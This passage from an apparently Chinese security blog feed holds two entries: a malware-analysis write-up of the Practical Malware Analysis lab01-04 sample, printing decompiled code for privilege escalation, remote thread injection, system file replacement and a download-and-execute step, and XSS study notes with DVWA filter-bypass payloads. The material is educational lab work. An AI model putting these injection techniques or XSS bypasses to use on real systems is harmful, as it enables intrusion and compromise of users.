src="https://upload-images.jianshu.io/upload_images/10480445-c946db7da751699e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>惯例脱壳，后续分析均基于脱壳后的lab01-04-new.exe进行。<br>将脱壳后的exe拖入PEiD，发现可以看到详细信息，证明脱壳成功。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-32b97b19faa3f059.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到该程序调用了<code>KRENEL32.dll</code>、<code>ADVAPI32.dll</code>、<code>MSVCRT.dll</code>，其中需要注意的函数将在Dependency Walker部分说明。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-dd77ae279adef2a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>转换时间戳得知该程序的编译时间是2019年8月30日，明显经过了篡改。<br>此外，该程序还包含了一个资源，具体分析详见Resource Hacker部分。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-93cc9081e5ec1c50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-b4e3c261e43a1fab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>查看字符串，可以发现<code>\winup.exe</code>、<code>\system32\wupdmgrd.exe</code>和<code>http:///www.practicalmalwareanalysis.com/updater.exe</code>等字样，其中wupdmgr.exe是电脑系统自动升级的程序文件，初步推测程序将会从指定网址下载更新器，并存为winup.exe或替换wupdmgrd.exe，实际情况仍有待进一步分析。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-91442febf445a3ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="Resource-Hacker"><a href="#Resource-Hacker" class="headerlink" title="Resource Hacker"></a>Resource Hacker</h4><p>用Resource Hacker打开该程序，通过<code>MZ</code>文件头和<code>PE</code>字样可以发现包含的是一个exe文件。选择<code>Action -&gt; save *.bin resource</code>将其导出为lab01-04-bin.exe，留待后续分析。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-637106054d6f172d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="Dependency-Walker-2"><a href="#Dependency-Walker-2" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h4><p>首先打开lab01-04-new.exe，界面如下。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-a2002343d7abea0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>需要注意的函数如下：</p><ul><li>KERNEL32.dll<ul><li>获取路径及文件相关<ul><li>GetTempPathA</li><li>GetWindowsDirectory</li><li>CreateFileA</li><li>WriteFile</li><li>MoveFileA</li></ul></li><li>二进制资源加载<ul><li>FindResourceA</li><li>LoadResource</li><li>SizeofResource</li></ul></li><li>获取句柄，大多用来操作远程进程<ul><li>GetCurrentProcess</li><li>OpenProcess</li><li>GetProcAddress</li></ul></li><li>运行文件，建立远程线程<ul><li>WinExec</li><li>CreateRemoteThread</li></ul></li></ul></li><li>ADVAPI32.dll<ul><li>OpenProcessToken</li><li>LookupPrivilegeValueA</li><li>AdjustTokenPrivileges</li></ul></li></ul><p>可以看出lab01-04-new.exe将会对自身创建的进程进行提权操作，并创建及移动某些文件。除此以外，该程序还将运行某个exe文件并创建远程线程，目的或为将代码注入指定exe执行。</p><p>再打开之前导出的lab01-04-bin.exe，界面如下。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-c39496eeb792a309.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>需要注意的函数如下：</p><ul><li>KERNEL32.dll<ul><li>GetTempPathA</li><li>GetWindowsDirectory</li><li>WinExec</li></ul></li><li>URLMON.dll<ul><li>URLDownloadToFileA</li></ul></li></ul><p>不难看出，lab01-04-bin.exe将从指定URL地址读取内容，并将读取到的内容保存到特定路径下的文件里，同时也会执行某个或某些exe文件，所执行的文件大几率为从网页上下载的程序。</p><h4 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h4><p>打开lab01-04-new.exe，F5反汇编，截取部分代码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main()</span></span><br><span class="line">  dword_403124 = (<span class="keyword">int</span> (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(v5, aEnumprocesses);</span><br><span class="line">  <span class="comment">//检索进程中的每一个进程标识符</span></span><br><span class="line">  <span class="keyword">if</span> ( dword_403124 &amp;&amp; dword_403128 &amp;&amp; dword_40312C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_403124(dwProcessId, <span class="number">4096</span>, &amp;v14) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v14 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7 + <span class="number">1</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dwProcessId[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          v19 = sub_401000(dwProcessId[i]);</span><br><span class="line">          <span class="keyword">if</span> ( v19 )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = dwProcessId[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v11 )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = sub_401174(v11);<span class="comment">//创建远程线程</span></span><br><span class="line">        <span class="keyword">if</span> ( v12 )<span class="comment">//若成功</span></span><br><span class="line">        &#123;</span><br><span class="line">          GetWindowsDirectoryA(&amp;Buffer, <span class="number">0x10E</span>u);<span class="comment">//获取目录</span></span><br><span class="line">          <span class="built_in">snprintf</span>(&amp;Dest, <span class="number">0x10E</span>u, aSS_0, &amp;Buffer, aSystem32Wupd_0);</span><br><span class="line">          <span class="comment">//将Dest赋值为wupdmgrd.exe的路径</span></span><br><span class="line">          GetTempPathA(<span class="number">0x10E</span>u, &amp;v20);<span class="comment">//获取临时路径</span></span><br><span class="line">          <span class="built_in">snprintf</span>(&amp;NewFileName, <span class="number">0x10E</span>u, aSS_1, &amp;v20, aWinup_exe);</span><br><span class="line">          <span class="comment">//将NewFileName赋值为winup.exe的路径</span></span><br><span class="line">          MoveFileA(&amp;Dest, &amp;NewFileName);<span class="comment">//将wupdmgrd.exe移动为临时路径下的winup.exe</span></span><br><span class="line">          sub_4011FC();<span class="comment">//创建、写入并运行新的wupdmgrd.exe</span></span><br><span class="line">          result = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>其中，与<code>v12 = sub_401174(v11);</code>有关的代码截取部分如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sub_401174()</span></span><br><span class="line">  <span class="keyword">if</span> ( sub_4010FC(aSedebugprivile) )<span class="comment">//若未提权</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span><span class="comment">//获取进程句柄需要在提权后才能进行</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = LoadLibraryA(LibFileName);</span><br><span class="line">    lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(v2, (LPCSTR)<span class="number">2</span>);</span><br><span class="line">    hProcess = OpenProcess(<span class="number">0x1F0FFF</span>u, <span class="number">0</span>, dwProcessId);<span class="comment">//获取进程句柄</span></span><br><span class="line">    <span class="keyword">if</span> ( hProcess )</span><br><span class="line">    &#123;</span><br><span class="line">      CreateRemoteThread(hProcess, <span class="number">0</span>, <span class="number">0</span>, lpStartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//建立远程线程</span></span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sub_4010FC()</span></span><br><span class="line">  <span class="keyword">if</span> ( LookupPrivilegeValueA(<span class="number">0</span>, lpName, (PLUID)NewState.Privileges) )</span><br><span class="line">  &#123;</span><br><span class="line">    AdjustTokenPrivileges(TokenHandle, <span class="number">0</span>, &amp;NewState, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//提权</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>对<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">```c</span><br><span class="line">//sub_4011FC()</span><br><span class="line">  GetWindowsDirectoryA(&amp;Buffer, 0x10Eu);</span><br><span class="line">  snprintf(&amp;Dest, 0x10Eu, Format, &amp;Buffer, aSystem32Wupdmg);</span><br><span class="line">  //将Dest赋值为将要创建的wupdmgrd.exe的路径</span><br><span class="line">  hModule = GetModuleHandleA(0);</span><br><span class="line">  hResInfo = FindResourceA(hModule, Name, Type);</span><br><span class="line">  lpBuffer = LoadResource(hModule, hResInfo);//加载资源</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(hModule, hResInfo);</span><br><span class="line">  hFile = CreateFileA(&amp;Dest, 0x40000000u, 1u, 0, 2u, 0, 0);</span><br><span class="line">  //创建wupdmgrd.exe</span><br><span class="line">  WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  //写入wupdmgrd.exe</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  return WinExec(&amp;Dest, 0);//运行</span><br></pre></td></tr></table></figure></p><p>打开lab01-04-bin.exe，F5反汇编，截取部分代码如下。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main()</span></span><br><span class="line">  GetTempPathA(<span class="number">0x10E</span>u, &amp;Buffer);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;Dest, <span class="number">0x10E</span>u, Format, &amp;Buffer, aWinup_exe);</span><br><span class="line">  <span class="comment">//将Dest赋值为临时文件夹下winup.exe的绝对路径</span></span><br><span class="line">  WinExec(&amp;Dest, <span class="number">5u</span>);</span><br><span class="line">  <span class="comment">//运行winup.exe</span></span><br><span class="line">  GetWindowsDirectoryA(&amp;v7, <span class="number">0x10E</span>u);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;CmdLine, <span class="number">0x10E</span>u, aSS_0, &amp;v7, aSystem32Wupdmg);</span><br><span class="line">  <span class="comment">//将CmdLine赋值为wupdmgrd.exe的绝对路径</span></span><br><span class="line">  <span class="keyword">if</span> ( !URLDownloadToFileA(<span class="number">0</span>, aHttpWww_practi, &amp;CmdLine, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="comment">//若已存在则运行，若不存在则下载</span></span><br><span class="line">    <span class="comment">//URLDownloadToFile下载文件前先在本地的缓存中查找此文件，如果存在则不会再次下载</span></span><br><span class="line">    WinExec(&amp;CmdLine, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><h4 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h4><p>该程序中包含了另一个exe文件（下称04-bin），其中，lab01-04为主体，负责提权、移动文件并向04-bin传递参数，04-bin主要起到下载器和运行的作用。<br>lab01-04首先提权以获取进程句柄并创建远程线程，此后将system32目录下的wupdmgrd.exe移动到临时文件夹下，再把自己的资源（04-bin）写入为新的wupdmgrd.exe并执行。04-bin查找本地是否存在特定文件A。若不存在，则从指定网址下载update.exe并存为该特定文件A；若存在，则执行该文件。</p>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习笔记</title>
      <link href="/2019/03/15/XSS%E7%AE%80%E8%BF%B0&amp;%E5%85%A5%E9%97%A8/"/>
      <url>/2019/03/15/XSS%E7%AE%80%E8%BF%B0&amp;%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>本学期课程的阶段性总结<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文><br>上课上自闭了，我真的不是web手也打不来web题……<br>写个总结，算是补上一年前跟大佬py到的那两道web的wp。<br>……我怎么总在搞给过去的自己打补丁这种沙雕行为（。<br>建议结合<a href="https://www.jianshu.com/p/5d123a4f55f9" target="_blank" rel="noopener">2019-03-17 XSS实验报告</a>观看。</the></p><h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS只是简单的把用户输入的数据“反射”给浏览器，也称为非持久型XSS（Non-persistent XSS），特点为单击时触发，执行一次。</p><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>通常出现在网站的搜索栏、用户登入口等地方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/10480445-83b7eb78bb3cb456.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h5 id="过滤字符的应对"><a href="#过滤字符的应对" class="headerlink" title="过滤字符的应对"></a>过滤字符的应对</h5><p>此处以DVWA为例。<br><strong>在Medium级别中，关键代码如下所示：</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-cc5d9878af990168.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到只过滤了<code>&lt;script&gt;</code>字符串，常用方法有更改大小写或双写以拼接<code>&lt;script&gt;</code>等，其他绕过方法详见文章“常见XSS变形”一节。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(<span class="number">1</span>)&lt;/sCript&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(<span class="number">222</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>在High级别中，关键代码如下所示：</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-7de3b3200d4ed035.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>关于上图代码中的正则表达式的说明如下，正则的更多语法和说明请参考文末链接。</p><table><thead><tr><th>代码</th><th>说明</th></tr></thead><tbody><tr><td>.</td><td>匹配除换行符以外的任意字符</td></tr><tr><td>*</td><td>重复零次或更多次</td></tr></tbody></table><blockquote><p>我们已经提到了怎么重复单个字符（直接在字符后面加上限定符就行了）；但如果想要重复多个字符又该怎么办？你可以用小括号来指定子表达式(也叫做分组)，然后你就可以指定这个子表达式的重复次数了，你也可以对子表达式进行其它一些操作(后面会有介绍)。</p></blockquote><p>可以看到对<code>&lt;script</code>做了正则搜索<code>(.*)</code>和大小写过滤<code>/i</code>，双写和大小写混淆不再有效，但没有做更多限制。因此可以选择放弃使用<code>&lt;script&gt;</code>标签，转而利用事件实现XSS。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">""</span> onerror=<span class="string">"alert(1)"</span>/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(<span class="number">1</span>) style=<span class="string">"display:none"</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS会把用户输入的数据“存储”在服务器端，又称为“持久型XSS”。<br>攻击者事先将恶意js代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意js代码的页面就会执行恶意代码，不需单击即可触发。</p><h4 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h4><p>多见于网页留言板、评论等，常见应对方法包括在前端或后台限制输入长度、或做敏感字符过滤等。</p><h5 id="限制长度的应对"><a href="#限制长度的应对" class="headerlink" title="限制长度的应对"></a>限制长度的应对</h5><p>前端限制长度只需f12开控制台更改代码即可，也可采用抓包更改传输数据。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-98d7af79b13237b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-950ab38c647e8f74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>后台数据库限制长度可采用注释绕过或拼接绕过，其中“利用注释绕过”这一方法现举例如下。<br>此处先提交<code>*/cookie&lt;/script&gt;</code>是由于后台的留言按时间倒序显示，因此会拼接为<code>&lt;script&gt;alert(doucument./*被注释的代码*/cookie)&lt;/script&gt;</code>。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-65e76f923efc845b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-252c62afc63eecc3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-f6564ac47a83c572.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h5 id="过滤字符的应对-1"><a href="#过滤字符的应对-1" class="headerlink" title="过滤字符的应对"></a>过滤字符的应对</h5><p>此处以DVWA为例。<br><strong>在Medium级别中，关键代码如下所示：</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-db1e80815611f282.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>可以看到虽然对<code>$message</code>变量做了<code>htmlspecialchars()</code>转换，但对<code>$name</code>的过滤却只过滤了<code>&lt;script&gt;</code>字符串，因此只要从<code>$name</code>着手即可。<br>此处举两个例子，其他绕过方法详见文章“常见XSS变形”一节。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(<span class="number">1</span>)&lt;/sCript&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(<span class="number">222</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/10480445-c7114d4adcb8ecee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-03323d91cefba043.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><strong>在High级别中，关键代码如下所示：</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-a1c1e270f557acda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到和反射型XSS的High级别相似，虽然过滤了<code>&lt;script</code>标签，但没有做更多过滤，可以创建事件以进行XSS攻击。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-05a30cde12b4ceb7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>更多过滤和绕过方法可以参考去年杭电week2的web题wp：<br><a href="https://github.com/vidar-team/Hgame2018_writeup/blob/master/week2/official_wp/week2_web_wp.pdf" target="_blank" rel="noopener">https://github.com/vidar-team/Hgame2018_writeup/blob/master/week2/official_wp/week2_web_wp.pdf</a></p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS是一种基于DOM树的XSS，通过修改页面的DOM（Document Object Model，文档对象模型）节点形成XSS。<br>例如服务器端经常使用<code>document.boby.innerHtml</code>等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。如果按照“是否保存在服务器端”来划分，DOM型XSS也是反射型XSS。</p><h4 id="应用-2"><a href="#应用-2" class="headerlink" title="应用"></a>应用</h4><p>可能触发DOM型XSS的属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.referer 属性</span><br><span class="line">window.name 属性</span><br><span class="line">location 属性</span><br><span class="line">innerHTML 属性</span><br><span class="line">documen.write 属性</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>此处仍以DVWA为例。<br><strong>在Medium级别中，代码如下</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123; </span><br><span class="line">    $default = $_GET[<span class="string">'default'</span>]; </span><br><span class="line">    <span class="comment"># Do not allow script tags </span></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">"&lt;script"</span>) !== <span class="keyword">false</span>) &#123; </span><br><span class="line">        header (<span class="string">"location: ?default=English"</span>); </span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以看出过滤了<code>&lt;script</code>，因此可以选择利用事件，构建语句：<code>&lt;img src=&#39;x&#39; onerror=&#39;alert(1)&#39;&gt;</code>，但输入后无事发生（。查看源代码：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-0d212a81b73d1ddb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以发现语句被插入到了value值中。为此，需要闭合前面的标签，即<code>&lt;select&gt;</code>和<code>&lt;option</code>。构建exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?default=English&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=&apos;x&apos; onerror=&apos;alert(1)&apos;&gt;</span><br></pre></td></tr></table></figure><p>此时拼接如下图：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-b03ea88e839bb9a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><strong>在High级别中，代码如下</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123; </span><br><span class="line">    <span class="comment"># White list the allowable languages </span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">'default'</span>]) &#123; </span><br><span class="line">        <span class="keyword">case</span> <span class="string">"French"</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="string">"English"</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="string">"German"</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="string">"Spanish"</span>: </span><br><span class="line">            <span class="comment"># ok </span></span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">default</span>: </span><br><span class="line">            header (<span class="string">"location: ?default=English"</span>); </span><br><span class="line">            <span class="keyword">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>url中字符<code>#</code>后的数据不会发送到服务器端，从而绕过服务端过滤。构造exp为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h2 id="常见XSS变形"><a href="#常见XSS变形" class="headerlink" title="常见XSS变形"></a>常见XSS变形</h2><p>根据过滤代码的写法采取不同的变形以绕过过滤，常见的有以下几种。</p><h4 id="扰乱过滤规则"><a href="#扰乱过滤规则" class="headerlink" title="扰乱过滤规则"></a>扰乱过滤规则</h4><h5 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;Script&gt;alert(<span class="number">1</span>)&lt;/sCript&gt;</span><br></pre></td></tr></table></figure><h5 id="引号的引用"><a href="#引号的引用" class="headerlink" title="引号的引用"></a>引号的引用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@ 无引号</span><br><span class="line">&lt;Img sRc=<span class="comment"># Onerror=alert(/xss/) /&gt;</span></span><br><span class="line">@ 单引号</span><br><span class="line">&lt;Img sRc=<span class="string">'#'</span> Onerror=<span class="string">'alert(/xss/)'</span> /&gt;</span><br><span class="line">@ 双引号</span><br><span class="line">&lt;Img sRc=<span class="string">"#"</span> Onerror=<span class="string">"alert(/xss/)"</span> /&gt;</span><br></pre></td></tr></table></figure><p>表格引用自 <a href="https://blog.csdn.net/n1ngsec/article/details/11909449" target="_blank" rel="noopener">XSS绕过 - N1nG - CSDN</a></p><table><thead><tr><th>类型</th><th>写法</th></tr></thead><tbody><tr><td>一个正常的XSS输入</td><td>\<img src="/2019/03/15/XSS简述&入门/javascript:alert(0);"></td></tr><tr><td>转换大小写后的XSS</td><td>\<img src="/2019/03/15/XSS简述&入门/javascript:alert(0);"></td></tr><tr><td>大小写混淆的XSS</td><td>\<img src="/2019/03/15/XSS简述&入门/jaVasCript:alert(0);"></td></tr><tr><td>不用双引号,而是使用单引号的XSS</td><td>\<img src="/2019/03/15/XSS简述&入门/javascript:alert(0);"></td></tr><tr><td>不使用引号的XSS</td><td>\<img src="/2019/03/15/XSS简述&入门/javascript:alert(0);"></td></tr></tbody></table><p>关于引号的作用，请阅读<a href="https://www.zhihu.com/question/27646993/answer/42865322" 